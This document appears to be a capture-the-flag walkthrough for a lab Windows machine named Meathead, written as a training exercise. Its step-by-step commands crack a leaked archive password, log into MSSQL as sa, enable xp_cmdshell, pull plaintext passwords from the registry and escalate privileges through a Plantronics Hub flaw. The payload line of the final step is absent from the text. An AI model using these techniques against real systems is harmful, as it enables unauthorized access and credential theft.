Walkthrough
Exploitation Guide for Meathead
Summary

In this walkthrough, we will exploit the target via leaked MSSQL sa user credentials and subsequently mine user credentials from the registry. We'll then escalate via the "Major Upgrade" feature in a vulnerable version of Plantronics Hub software.
Enumeration
Nmap

We'll begin with an nmap scan against all TCP ports.

kali@kali~# sudo nmap -p- 192.168.65.70
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 22:01 EST
Nmap scan report for 192.168.65.70
Host is up (0.069s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1221/tcp open  sweetware-apps
1435/tcp open  ibm-cics
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 128.50 seconds

It appears that a web server is running on port 80 and ports 139 and 445 indicate the existence of an SMB server. We can also assume that RDP is enabled since port 3389 is open. Ports 1221 and 1435 are interesting and uncommon.
HTTP

Browsing the web server presents a Plantronics login page.

Directory enumeration is ineffective since most directories return a 403. In addition, there is no obvious way to determine the Plantronics software version.
SMB

Since anonymous logins are not allowed, SMB denies our connection.
Port 1221

Netcat interaction suggests that the Microsoft FTP Service is running on port 1221.

kali@kali:~$ nc 192.168.65.70 1221
220 Microsoft FTP Service

Let's use the client to test anonymous FTP access.

kali@kali:~$ ftp 192.168.65.70 1221
Connected to 192.168.65.70.
220 Microsoft FTP Service
Name (192.168.65.70:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (192,168,65,70,194,17).
150 Opening ASCII mode data connection.
04-27-20  07:02PM                18866 Elementum Supremum.docx
04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
04-27-20  07:02PM                15690 img.jpg
04-27-20  07:02PM                  302 MSSQL_BAK.rar
04-27-20  07:02PM                  548 palindromes.txt
04-27-20  07:02PM                45369 server.jpg
226 Transfer complete.
ftp>

This succeeds. Note that since the default active mode created performance issues, we switched to passive mode.
Port 1435

Netcat interaction with port 1435 returns nothing. However, running an nmap fingerprinting scan reveals that this is an MSSQL server.

kali@kali:~$ sudo nmap -p 1435 192.168.65.70 -A -sV -T4
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 22:29 EST
Nmap scan report for 192.168.65.70
Host is up (0.071s latency).

PORT     STATE SERVICE  VERSION
1435/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000
| ms-sql-ntlm-info: 
|   Target_Name: MEATHEAD
|   NetBIOS_Domain_Name: MEATHEAD
|   NetBIOS_Computer_Name: MEATHEAD
|   DNS_Domain_Name: Meathead
|   DNS_Computer_Name: Meathead
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-07-18T10:37:43
|_Not valid after:  2050-07-18T10:37:43
|_ssl-date: 2020-12-30T03:30:34+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops

TRACEROUTE (using port 1435/tcp)
HOP RTT      ADDRESS
1   71.37 ms 192.168.49.1
2   71.40 ms 192.168.65.70

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.03 seconds

Exploitation
Anonymous FTP Access

Since we have access to the MSSQL server, the MSSQL_BAK.rar file we discovered on the FTP server is worth investigating. Let's attempt to download it.

ftp> get MSSQL_BAK.rar
local: MSSQL_BAK.rar remote: MSSQL_BAK.rar
227 Entering Passive Mode (192,168,65,70,194,18).
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
302 bytes received in 0.07 secs (4.3591 kB/s)
ftp>

Archive Password Cracking

After downloading the file, we attempt to extract it, but discover that it is password protected. Let's attempt to crack the password with john. We'll first generate a hash with the rar2john utility.

kali@kali:~$ rar2john MSSQL_BAK.rar > MSSQL_BAK.txt
kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt MSSQL_BAK.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmeinplease    (MSSQL_BAK.rar)
1g 0:00:02:13 DONE (2020-12-29 22:38) 0.007491g/s 1041p/s 1041c/s 1041C/s lily03..laptop123
Use the "--show" option to display all of the cracked passwords reliably
Session completed

Although the letmeinplease password is quite polite, it's not particularly secure. Let's use it to extract the contents of the .rar file.

kali@kali:~$ unrar x MSSQL_BAK.rar 

UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal

Enter password (will not be echoed) for MSSQL_BAK.rar: 


Extracting from MSSQL_BAK.rar

Extracting  mssql_backup.txt                                          OK 
All OK
kali@kali:~$ cat mssql_backup.txt 
Username: sa
Password: EjectFrailtyThorn425

Nice. This worked perfectly. We should now be able to authenticate to the MSSQL server with sa privileges using this password.
MSSQL Command Execution

Before we attempt to authenticate as this user, we'll need to configure sqsh. First, we'll append the target server information to /etc/freetds/freetds.conf.

# Meathead MSSQL Server
[Meathead]
        host = 192.168.65.70
        port = 1435
        tds version = 8.0

Next, we'll create a .sqshrc file with the discovered credentials.

kali@kali:~$ cat ~/.sqshrc
\set username=sa
\set password=EjectFrailtyThorn425
\set style=vert

Now we're ready to connect to the server with sqsh.

kali@kali:~$ sqsh -S Meathead
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> SELECT @@VERSION;
2> go
: Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
  Aug 22 2017 17:04:49 
  Copyright (C) 2017 Microsoft Corporation
  Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
 
(1 row affected)
1>

Since we're connected as sa, we can run OS commands on the target through xp_cmdshell. We'll start by enabling it.

1> EXEC sp_configure 'show advanced option', '1';
2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> RECONFIGURE WITH OVERRIDE;
2> go
1> EXEC sp_configure 'xp_cmdshell', 1;
2> go
Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> RECONFIGURE;
2> go
1> EXEC sp_configure 'show advanced option';
2> go
name:         show advanced options
minimum:      0
maximum:      1
config_value: 1
run_value:    1
 
(return status = 0)
1>

Next, we'll run a simple test.

1> xp_cmdshell 'whoami';
2> go
output: nt service\mssql$sqlexpress
 
output: NULL
 
(2 rows affected, return status = 0)
1>

This confirms we have command execution on the target.
Local Enumeration

We could upload a shell, but let's assume that AV is running on the target. Instead, we'll enumerate the target before proceeding. We may be able to find another attack vector.

Let's begin by querying system information:

1> xp_cmdshell 'systeminfo';
2> go
output: NULL
 
output: Host Name:                 MEATHEAD
 
output: OS Name:                   Microsoft Windows Server 2019 Standard
 
output: OS Version:                10.0.17763 N/A Build 17763
 
output: OS Manufacturer:           Microsoft Corporation
 
output: OS Configuration:          Standalone Server
 
output: OS Build Type:             Multiprocessor Free
 
output: Registered Owner:          Windows User

*snip*

We can also view the user list.

1> xp_cmdshell 'net user';
2> go
output: NULL
 
output: User accounts for \\
 
output: NULL
 
output: -------------------------------------------------------------------------------
 
output: Administrator            DefaultAccount           Guest                    
 
output: jane                     WDAGUtilityAccount       
 
output: The command completed with one or more errors.
 
output: NULL
 
output: NULL
 
(9 rows affected, return status = 1)

Now that we have discovered usernames, let's start searching for low-hanging fruit before we try anything more complicated. We'll begin by searching for plaintext passwords. We run a few filesystem searches, but don't find anything useful. Let's instead search the registry. We'll begin with a simple search for pass.

reg query HKLM /f pass /t REG_SZ /s

1> xp_cmdshell 'reg query HKLM /f pass /t REG_SZ /s';
2> go
output: NULL
 
output: HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0fafd998-c8e8-42a1-86d7-7c10c664a415}
 
output:     (Default)    REG_SZ    Picture Password Enrollment UX

...

output: NULL
 
output: HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control
 
output:     CurrentPass    REG_SZ    TwilightAirmailMuck234
 
output: NULL

...

Sifting through the data, we find what looks like a plaintext password. Let's attempt to authenticate with this password.
RDP

Although the password doesn't work for the Administrator account, it does work for the jane account. Since port 3389 is open, let's attempt to connect with RDP.

kali@kali:~$ rdesktop 192.168.65.70 -u "jane" -p "TwilightAirmailMuck234"
Autoselecting keyboard map 'en-us' from locale

We now have GUI access to the target!
Escalation
Plantronics Hub Local Privilege Escalation

The desktop view is relatively unexciting, but the Plantronics Hub shortcut looks interesting:

Let's run it and check the version.

We'll enter this software (plantronics) and version (3.13.2) into searchsploit.

kali@kali:~$ searchsploit plantronics 3.13.2
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Plantronics Hub 3.13.2 - Local Privilege Escalation                                                  | windows/local/47845.txt
Plantronics Hub 3.13.2 - SpokesUpdateService Privilege Escalation (Metasploit)                       | windows/local/47944.rb
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

We'll also run this search through the Exploit Database, which returns this link. Let's focus on this exploit.

The walkthrough instructs us to create a C:\ProgramData\Plantronics\Spokes3G\MajorUpgrade.config file in the Plantronics ProgramData directory. The file should contain a single line that follows a specific format:

<WINDOWS-USERNAME>|advertise|<FULL-PATH-TO-YOUR-DESIRED-PAYLOAD>

Since we have GUI access, we'll go ahead and create the file in notepad and then save it to the directory specified in the exploit. In our case, the file will contain this line:

Once we enter this line and save the file, we should be presented with a full system shell.

